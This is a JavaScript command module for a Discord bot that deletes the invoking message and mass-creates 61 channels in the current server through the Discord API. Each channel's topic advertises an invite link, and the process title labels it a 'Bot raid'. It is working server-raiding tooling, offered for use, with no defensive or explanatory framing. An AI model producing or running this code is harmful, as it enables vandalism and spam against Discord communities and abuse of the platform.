const config = require("../config.json")
const axios = require("axios")
const Discord = require("discord.js")

const channelCreate = config.channelCreate
const token = config.token

module.exports = {
  name: 'mcc',
  description: 'Create mass channels',
  execute(message, args) {
    message.delete()



    for(let i = 0; i <= 60; i++){

        process.title = `Mass creation channels | Channels created: ${i}  | Bot raid created by yiko `

        axios.post(
        `https://discord.com/api/v9/guilds/${message.guild.id}/channels`, {
            name: `${channelCreate}`,
             type: 0,
             topic: `IDH x ${message.author.username}  | discord.gg/idhontop`,
              },    
              {
                headers: {
                authorization: `Bot ${token}`,
                'Content-Type': 'application/json',
              }
        }).then( () => {
            console.log(`[CONSOLE]: NUMERO DEL CANAL CREADO ${i}`)
        })

    }   

}}